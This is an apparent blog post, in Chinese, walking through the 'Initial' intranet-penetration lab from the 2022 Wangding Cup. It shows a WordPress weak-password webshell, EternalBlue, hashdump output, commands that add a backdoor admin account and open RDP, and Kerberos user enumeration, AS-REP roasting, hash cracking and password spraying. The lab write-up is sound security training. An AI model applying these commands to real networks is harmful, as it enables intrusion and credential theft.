@@ -1,0 +1,813 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>春秋云镜-Initial | X1NRI&#39;s trash</title>
+  <meta name="author" content="X1NRI">
+  
+  <meta name="description" content="该靶场为 2022 第三届网鼎杯决赛内网靶场复盘。完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 flag，分布于不同的靶机
+
+
+Wordpress
+内网渗透
+域渗透
+Kerberos
+AD CS
+
+
+参考文章：2022网鼎杯半决赛复盘 - 春秋云境 | h0ny’s blog
+
+外网边界信息搜集
+wordpress CMS
+goby扫下端口，顺便打些常见poc看了是要从wordpress入手了
+wp cms漏洞几乎都在后台，所以第一步得肯定先登录
+wpscan枚举用户名"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="春秋云镜-Initial"/>
+  <meta property="og:site_name" content="X1NRI&#39;s trash"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="X1NRI&#39;s trash" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">X1NRI&#39;s trash</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/links" title="Subscribe me.">
+			  <i class="fa fa-chain"></i>Links
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 春秋云镜-Initial</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <blockquote>
+<p>该靶场为 2022 第三届网鼎杯决赛内网靶场复盘。完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 flag，分布于不同的靶机</p>
+</blockquote>
+<ul>
+<li>Wordpress</li>
+<li>内网渗透</li>
+<li>域渗透</li>
+<li>Kerberos</li>
+<li>AD CS<br><img src="/Rxi134_FILE/9413e66ce78560bb2ba13b43acdc5def_MD5.jpeg"></li>
+</ul>
+<blockquote>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://h0ny.github.io/posts/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/#cve-2022-26923">2022网鼎杯半决赛复盘 - 春秋云境 | h0ny’s blog</a></p>
+</blockquote>
+<h1 id="外网边界"><a href="#外网边界" class="headerlink" title="外网边界"></a>外网边界</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p><img src="/Rxi134_FILE/4833fb5d719e8a5d43f3a8a79f9fc202_MD5.jpeg"></p>
+<p>wordpress CMS<br><img src="/Rxi134_FILE/e98aad79491ddca060c8bc53f5254d2b_MD5.jpeg"></p>
+<p>goby扫下端口，顺便打些常见poc<br><img src="/Rxi134_FILE/b3a4ae98dc416dcb4354967ae4c02b9b_MD5.jpeg"><br>看了是要从wordpress入手了</p>
+<p>wp cms漏洞几乎都在后台，所以第一步得肯定先登录</p>
+<p>wpscan枚举用户名<br><img src="/Rxi134_FILE/6173f98f69929150853d1047d43051f0_MD5.jpeg"></p>
+<p>默认情况下 WordPress 后台登录界面在 <code>/wp-login.php</code>下<br><img src="/Rxi134_FILE/794601caf42b0b30fcf1b5227932b87d_MD5.jpeg"></p>
+<p>admin用户名是存在的<br><img src="/Rxi134_FILE/27c534e85ad5aaed93065087ef7e86fd_MD5.jpeg"></p>
+<h2 id="wp弱口令-后台模板写入webshell"><a href="#wp弱口令-后台模板写入webshell" class="headerlink" title="wp弱口令+后台模板写入webshell"></a>wp弱口令+后台模板写入webshell</h2><p>admin:123456 直接就进去了<br><img src="/Rxi134_FILE/46b5e2bf0582fc6a4fc6d86de5d798db_MD5.jpeg"></p>
+<p>直奔后台模板，向其写入webshell<br><img src="/Rxi134_FILE/07ea44861514bbb57f25911a36710969_MD5.jpeg"></p>
+<p>连接webshell，主题名为 twentytwentyone<br><img src="/Rxi134_FILE/0c1700c6f926e90465dcd0eb3f4a4d7f_MD5.jpeg"></p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">http://&lt;IP>/wp-content/themes/twentytwentyone/404.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/Rxi134_FILE/332cab396b795a573acf9d924989ff42_MD5.jpeg"></p>
+<h2 id="获取flag01"><a href="#获取flag01" class="headerlink" title="获取flag01"></a>获取flag01</h2><p>在根目录直接就能cat flag，看来没必要提权了<br><img src="/Rxi134_FILE/9076a28edb5db8688a1334ab9ad31e91_MD5.jpeg"></p>
+<h2 id="获取数据库密码"><a href="#获取数据库密码" class="headerlink" title="获取数据库密码"></a>获取数据库密码</h2><p>翻翻wp cms的配置文件，位置在<code>/var/www/html/wp-config.php</code></p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">// ** Database settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** Database username */
+define( 'DB_USER', 'root' );
+
+/** Database password */
+define( 'DB_PASSWORD', 'Root@O4oLkum3' );
+
+/** Database hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8mb4' );
+
+/** The database collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>尝试去ssh连接，提示需要密钥登录<br><img src="/Rxi134_FILE/2d14cb61c01f4b178ef973683d15735f_MD5.jpeg"></p>
+<p>似乎并没有什么密钥<br><img src="/Rxi134_FILE/13bacaa0861d463313c52ae0875a3c90_MD5.jpeg"></p>
+<h2 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h2><p>我就直接开个端口正连了<br><img src="/Rxi134_FILE/b130f3f2a4d89f000222ecd749fad4fe_MD5.jpeg"></p>
+<p>可以利用python起一个伪终端<br><img src="/Rxi134_FILE/ae12d3eda96d34af7b538f640491e490_MD5.jpeg"></p>
+<h2 id="搭建socks代理"><a href="#搭建socks代理" class="headerlink" title="搭建socks代理"></a>搭建socks代理</h2><p>chisel<br><img src="/Rxi134_FILE/ef55ddbf086e27ff00f5f2ae04ff6f87_MD5.jpeg"></p>
+<h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><p>内网网段为 172.22.15.0&#x2F;24，该web机内网ip为 172.22.15.26</p>
+<h2 id="fscan内网大保健"><a href="#fscan内网大保健" class="headerlink" title="fscan内网大保健"></a>fscan内网大保健</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">start infoscan
+trying RunIcmp2
+The current user permissions unable to send icmp packets
+start ping
+(icmp) Target 172.22.15.24    is alive
+(icmp) Target 172.22.15.26    is alive
+(icmp) Target 172.22.15.35    is alive
+(icmp) Target 172.22.15.18    is alive
+(icmp) Target 172.22.15.13    is alive
+[*] Icmp alive hosts len is: 5
+172.22.15.13:445 open
+172.22.15.18:445 open
+172.22.15.35:445 open
+172.22.15.24:445 open
+172.22.15.13:139 open
+172.22.15.18:139 open
+172.22.15.35:139 open
+172.22.15.24:139 open
+172.22.15.13:135 open
+172.22.15.18:135 open
+172.22.15.35:135 open
+172.22.15.24:135 open
+172.22.15.13:88 open
+172.22.15.18:80 open
+172.22.15.24:80 open
+172.22.15.26:80 open
+172.22.15.24:3306 open
+172.22.15.26:22 open
+[*] alive ports len is: 18
+start vulscan
+[*] NetInfo 
+[*]172.22.15.13
+   [->]XR-DC01
+   [->]172.22.15.13
+[*] NetInfo 
+[*]172.22.15.18
+   [->]XR-CA
+   [->]172.22.15.18
+[*] NetInfo 
+[*]172.22.15.24
+   [->]XR-WIN08
+   [->]172.22.15.24
+[*] NetBios 172.22.15.13    [+] DC:XR-DC01.xiaorang.lab          Windows Server 2016 Standard 14393
+[*] NetInfo 
+[*]172.22.15.35
+   [->]XR-0687
+   [->]172.22.15.35
+[+] MS17-010 172.22.15.24	(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)
+[*] OsInfo 172.22.15.13	(Windows Server 2016 Standard 14393)
+[*] NetBios 172.22.15.18    XR-CA.xiaorang.lab                  Windows Server 2016 Standard 14393
+[*] NetBios 172.22.15.24    WORKGROUP\XR-WIN08                  Windows Server 2008 R2 Enterprise 7601 Service Pack 1
+[*] NetBios 172.22.15.35    XIAORANG\XR-0687              
+[*] WebTitle http://172.22.15.26       code:200 len:39962  title:XIAORANG.LAB
+[*] WebTitle http://172.22.15.18       code:200 len:703    title:IIS Windows Server
+[*] WebTitle http://172.22.15.24       code:302 len:0      title:None 跳转url: http://172.22.15.24/www
+[+] PocScan http://172.22.15.18 poc-yaml-active-directory-certsrv-detect 
+[*] WebTitle http://172.22.15.24/www/sys/index.php code:200 len:135    title:None
+已完成 18/18
+[*] 扫描结束,耗时: 13.710814675s
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>域名 xiaorang.lab<br><img src="/Rxi134_FILE/8b3f32c2be226753b8ae9ccabffe6a5b_MD5.jpeg"></p>
+<p>扫出个永恒之蓝</p>
+<h2 id="永恒之蓝拿下-172-22-15-24-XR-WIN08"><a href="#永恒之蓝拿下-172-22-15-24-XR-WIN08" class="headerlink" title="永恒之蓝拿下 172.22.15.24 XR-WIN08"></a>永恒之蓝拿下 172.22.15.24 XR-WIN08</h2><p>msf+setg直接拿下，真不错<br><img src="/Rxi134_FILE/60eee33f692fd7e97500c22bf16c3e1b_MD5.jpeg"></p>
+<h3 id="获取flag02"><a href="#获取flag02" class="headerlink" title="获取flag02"></a>获取flag02</h3><p><img src="/Rxi134_FILE/49b6d2ee5e8dbcd8421616ce091361e2_MD5.jpeg"></p>
+<h3 id="域信息搜集"><a href="#域信息搜集" class="headerlink" title="域信息搜集"></a>域信息搜集</h3><p>systeminfo</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">
+Host Name:                 XR-WIN08
+OS Name:                   Microsoft Windows Server 2008 R2 Enterprise 
+OS Version:                6.1.7601 Service Pack 1 Build 7601
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          
+Registered Organization:   Aliyun
+Product ID:                00486-001-0001076-84509
+Original Install Date:     2023/2/1, 12:24:48
+System Boot Time:          2024/11/17, 22:04:31
+System Manufacturer:       Alibaba Cloud
+System Model:              Alibaba Cloud ECS
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz
+BIOS Version:              SeaBIOS 449e491, 2014/4/1
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             zh-cn;Chinese (China)
+Input Locale:              zh-cn;Chinese (China)
+Time Zone:                 (UTC+08:00) Beijing, Chongqing, Hong Kong, Urumqi
+Total Physical Memory:     3,950 MB
+Available Physical Memory: 3,051 MB
+Virtual Memory: Max Size:  3,948 MB
+Virtual Memory: Available: 2,966 MB
+Virtual Memory: In Use:    982 MB
+Page File Location(s):     N/A
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 57 Hotfix(s) Installed.
+                           [01]: KB981391
+                           [02]: KB981392
+                           [03]: KB977236
+                           [04]: KB981111
+                           [05]: KB977238
+                           [06]: KB2849697
+                           [07]: KB2849696
+                           [08]: KB2841134
+                           [09]: KB2841134
+                           [10]: KB977239
+                           [11]: KB2670838
+                           [12]: KB2830477
+                           [13]: KB2592687
+                           [14]: KB3191566
+                           [15]: KB981390
+                           [16]: KB2386667
+                           [17]: KB2533623
+                           [18]: KB2545698
+                           [19]: KB2547666
+                           [20]: KB2574819
+                           [21]: KB2603229
+                           [22]: KB2639308
+                           [23]: KB2685811
+                           [24]: KB2685813
+                           [25]: KB2729094
+                           [26]: KB2731771
+                           [27]: KB2732059
+                           [28]: KB2750841
+                           [29]: KB2761217
+                           [30]: KB2786081
+                           [31]: KB2809215
+                           [32]: KB2834140
+                           [33]: KB2872035
+                           [34]: KB2882822
+                           [35]: KB2888049
+                           [36]: KB2919469
+                           [37]: KB2923545
+                           [38]: KB2970228
+                           [39]: KB3006137
+                           [40]: KB3018238
+                           [41]: KB3020369
+                           [42]: KB3054205
+                           [43]: KB3068708
+                           [44]: KB3080149
+                           [45]: KB3102429
+                           [46]: KB3125574
+                           [47]: KB3138612
+                           [48]: KB3140245
+                           [49]: KB3172605
+                           [50]: KB3179573
+                           [51]: KB3210131
+                           [52]: KB4019990
+                           [53]: KB4040980
+                           [54]: KB4490628
+                           [55]: KB4532945
+                           [56]: KB4536952
+                           [57]: KB976902
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Red Hat VirtIO Ethernet Adapter
+                                 Connection Name: 本地连接 2
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     172.22.255.253
+                                 IP address(es)
+                                 [01]: 172.22.15.24
+                                 [02]: fe80::e186:a97a:c358:7284
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>WORKGROUP，只是个工作组的机子…</p>
+<h3 id="密码抓取-hashdump（失败）"><a href="#密码抓取-hashdump（失败）" class="headerlink" title="密码抓取 &amp; hashdump（失败）"></a>密码抓取 &amp; hashdump（失败）</h3><p>导入kiwi模块，p都抓不出来<br><img src="/Rxi134_FILE/aa1edcb63963108aa15d47bc2a3b18eb_MD5.jpeg"></p>
+<p>dump 出 hash，好像也没什么用</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e52d03e9b939997401466a0ec5a9cbc:::        
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                 
+hacker:1001:aad3b435b51404eeaad3b435b51404ee:94994b74f29662fc4d702f2f3b0df327:::  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>也没有其它用户<br><img src="/Rxi134_FILE/2828ccbfeac974b2e44552d3f6d15330_MD5.jpeg"></p>
+<h3 id="远程桌面（失败）"><a href="#远程桌面（失败）" class="headerlink" title="远程桌面（失败）"></a>远程桌面（失败）</h3><p>添加新用户</p>
+<pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">net user hacker P@assword &#x2F;add
+net user hacker &#x2F;active:yes
+net localgroup administrators hacker &#x2F;add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>开放防火墙端口</p>
+<pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>挂全局代理mstc上去，？<br><img src="/Rxi134_FILE/cab37ebe925ed35ac6bd33c957988736_MD5.jpeg"></p>
+<h3 id="寻找突破点"><a href="#寻找突破点" class="headerlink" title="寻找突破点"></a>寻找突破点</h3><h4 id="可用信息搜集"><a href="#可用信息搜集" class="headerlink" title="可用信息搜集"></a>可用信息搜集</h4><p>本机80端口还有个网站，是一个OA系统<br><img src="/Rxi134_FILE/7be8a60bff3e705de240d6a181dc7558_MD5.jpeg"></p>
+<p>是用phpstudy搭的，直接把所有源码下载下来看看</p>
+<p>试试弱口令，admin:123456又进去了<br><img src="/Rxi134_FILE/e4b617065cb7c2fd29307a6d8eeb36b2_MD5.jpeg"><br>不过啥都没有</p>
+<p>翻翻配置文件，在<code>C:\phpstudy_pro\WWW\config</code>下有一些可疑文件，下载下来审计<br><img src="/Rxi134_FILE/3df9667d8921108277e14fa30189a17e_MD5.jpeg"></p>
+<p>还真找到东西了，my.php里有mysql的账密</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">&lt;?php
+$config->installed    = true;
+$config->debug        = false;
+$config->requestType  = 'GET';
+$config->db->host     = '127.0.0.1';
+$config->db->port     = '3306';
+$config->db->name     = 'zdoo';
+$config->db->user     = 'root';
+$config->db->password = 'root@#123';
+$config->db->prefix   = 'zdoo';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>远程连接看看<br><img src="/Rxi134_FILE/555466d2d8d21e13d5f83bfe1a5ff854_MD5.jpeg"></p>
+<p>在 zoodsys_user找到一些信息</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">admin
+lixiuying
+lixiaoliang
+zhangyi
+jiaxiaoliang
+zhangli
+zhangwei
+liuqiang
+wangfang
+wangwei
+wanglihong
+huachunmei
+wanghao
+zhangxinyu
+huzhigang
+lihongxia
+wangyulan
+chenjianhua
+
+lixiuying@xiaorang.lab
+lixiaoliang@xiaorang.lab
+zhangyi@xiaorang.lab
+jiaxiaoliang@xiaorang.lab
+zhangli@xiaorang.lab
+zhangwei@xiaorang.lab
+liuqiang@xiaorang.lab
+wangfang@xiaorang.lab
+wangwei@xiaorang.lab
+wanglihong@xiaorang.lab
+huachunmei@xiaorang.lab
+wanghao@xiaorang.lab
+zhangxinyu@xiaorang.lab
+huzhigang@xiaorang.lab
+lihongxia@xiaorang.lab
+wangyulan@xiaorang.lab
+chenjianhua@xiaorang.lab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>哎，这后面跟个 @xiaorang.lab 很可疑，这不是标准的域用户名格式吗</p>
+<p>整理成 username.txt 为后续喷洒作准备</p>
+<h4 id="域内用户名枚举"><a href="#域内用户名枚举" class="headerlink" title="域内用户名枚举"></a>域内用户名枚举</h4><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">kerbrute_windows_amd64.exe userenum -d xiaorang.lab C:\Users\Anonymous\Desktop\username.txt --dc 172.22.15.13<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/Rxi134_FILE/a5a8e6b365056637877a05245bccb780_MD5.jpeg"></p>
+<p>可用域用户有四个</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">lixiuying@xiaorang.lab
+lihongxia@xiaorang.lab
+huachunmei@xiaorang.lab
+chenjianhua@xiaorang.lab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="asrep-roasting"><a href="#asrep-roasting" class="headerlink" title="asrep roasting"></a>asrep roasting</h4><p>梳理一下现在已有的东西：</p>
+<ol>
+<li>我们在域外</li>
+<li>我们现在有域用户名</li>
+</ol>
+<p>那就很明了了，直奔看看有没有用户关闭了预认证</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">C:\Penetration\IntranetTools\imPacket\impacket-linux\examples>python GetNPUsers.py -usersfile C:\Users\Anonymous\Desktop\true_username.txt -format john -dc-ip 172.22.15.13 xiaorang.lab/
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+$krb5asrep$lixiuying@xiaorang.lab@XIAORANG.LAB:4f72370e5984a9cc5caff93b80bcf7a5$dc3a5d5e33684241c3282d91b81c43aaeba6c7aa0df810c912d04f39df97b790a5c229d8d7e0f718f558f64f9e0bf92cba674b633c6fa8a549c8afbc6fb58889fb5610f340199b7c1e5c469b3598fb0c6e9915ef4388c11f085934b50e0d130338b4d2f4a7cf8ad0ac18d7e7ca6493860ac44cae56cbc9263d6fa2d8c2389c3d50d001cb634d65eacb706faa6e431f185a22bfe5593daa947bce68593f514b373b1473afd9d654b7f13ba559d7cb1a92c5c9bad2e162d3b46b5560ccd5ff2e09e1a724c5a945dc2d8d574352546ae2ed48e1f2487a0e72a380fd4c1623f9df9fc8a4a7ff072527410af73db2
+[-] User lihongxia@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$huachunmei@xiaorang.lab@XIAORANG.LAB:14b2f48e289f2bc4e69e361090220769$f385b8fba5587821ece1dc7b8922aafff018e976f30f147e65755046ecc1e254dbf675a9631e94f35b458d2abade2a611b4bd817f82d16257f7af18a72ee10bd3457269bf6b13fd451f170a60d49091636e7d26d0b7e1e415c3b4517769916d4785ff007934be5db65ddb9dcf3092b4ef2d3137ef34865f4b568ba59501d1989492343e7ec5f69c214d8a8df5ca3e628c58d3b494f20f90564840e9c6be0e9118b77b123abe4dc0202479c7db4ef50638c08c55c95aa10d2f41ea9b1ec7068bc8cd13e640169a22ec333a0d1ea65ac7cb2e0407a389ba6e8445d46c40a9a8c4ca84f596c714839040eca458f
+[-] User chenjianhua@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>破解 logon session key，字典选用 rockyou</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashcat.exe <span class="token parameter variable">-m</span> <span class="token number">18200</span> C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span><span class="token number">19085</span><span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>hash1.hash C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span><span class="token number">19085</span><span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>wordlists<span class="token punctuation">\</span>rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/Rxi134_FILE/bdcb1c278bf434fd2b753e3e4fd92b1f_MD5.jpeg"></p>
+<p>秒破</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">lixiuying@xiaorang.lab:winniethepooh
+huachunmei@xiaorang.lab:1qaz2wsx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+<h2 id="拿下-172-22-15-35-XR-0687"><a href="#拿下-172-22-15-35-XR-0687" class="headerlink" title="拿下 172.22.15.35 XR-0687"></a>拿下 172.22.15.35 XR-0687</h2><p>有了两组凭据，首先肯定是要来喷洒一波了</p>
+<p>整理一下用户名和密码，把administrator也添上去碰碰运气：</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">lixiuying
+huachunmei
+administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">winniethepooh
+1qaz2wsx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h3><p>先找rdp、winrm这种能直接远控的协议</p>
+<p>172.22.15.35 172.22.15.18 172.22.15.13</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains netexec rdp <span class="token number">172.22</span>.15.35 <span class="token number">172.22</span>.15.18 <span class="token number">172.22</span>.15.13 <span class="token parameter variable">-u</span> ./username.txt <span class="token parameter variable">-p</span> ./password.txt <span class="token parameter variable">--continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/Rxi134_FILE/c99a00423fb5645fb03568e215a671f6_MD5.jpeg"></p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">172.22.15.35    3389   XR-0687          [+] xiaorang.lab\lixiuying:winniethepooh (Pwn3d!)
+172.22.15.35    3389   XR-0687          [+] xiaorang.lab\huachunmei:1qaz2wsx (Pwn3d!)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h3><p>利用proxyfier<br><img src="/Rxi134_FILE/715dd5500579b22671c61353ca671afe_MD5.jpeg"></p>
+<p>成功连接<br><img src="/Rxi134_FILE/61942a5d9999e5d99dcedf2b1d21fa0f_MD5.jpeg"><br>但是没找到flag</p>
+<p>顺带连下证书机和域控，果然都不行<br><img src="/Rxi134_FILE/e7e226c037add55d66bbdaeb1dfd781a_MD5.jpeg"></p>
+<h3 id="winpeas"><a href="#winpeas" class="headerlink" title="winpeas"></a>winpeas</h3><p>上传枚举一波信息，没有找到什么东西</p>
+<h3 id="域信息搜集-1"><a href="#域信息搜集-1" class="headerlink" title="域信息搜集"></a>域信息搜集</h3><p>现在咱们终于到域里面了</p>
+<ul>
+<li><p>whoami<br><img src="/Rxi134_FILE/ec61791b360839bcabece58150969963_MD5.jpeg"></p>
+</li>
+<li><p>域用户<br><img src="/Rxi134_FILE/35980daf47ccb8fe4da3f8ba73b120e5_MD5.jpeg"></p>
+</li>
+<li><p>域组<br>我们权限太低，看不到<br><img src="/Rxi134_FILE/1b1862c6e46de239bf1183806908dddd_MD5.jpeg"></p>
+</li>
+</ul>
+<h3 id="ACL分析"><a href="#ACL分析" class="headerlink" title="ACL分析"></a>ACL分析</h3><h4 id="ADFind（失败）"><a href="#ADFind（失败）" class="headerlink" title="ADFind（失败）"></a>ADFind（失败）</h4><p>查一下这两个用户对域内对象的ACL：lixiuying、huachunmei</p>
+<p>先找下dcsync，过滤下sddl</p>
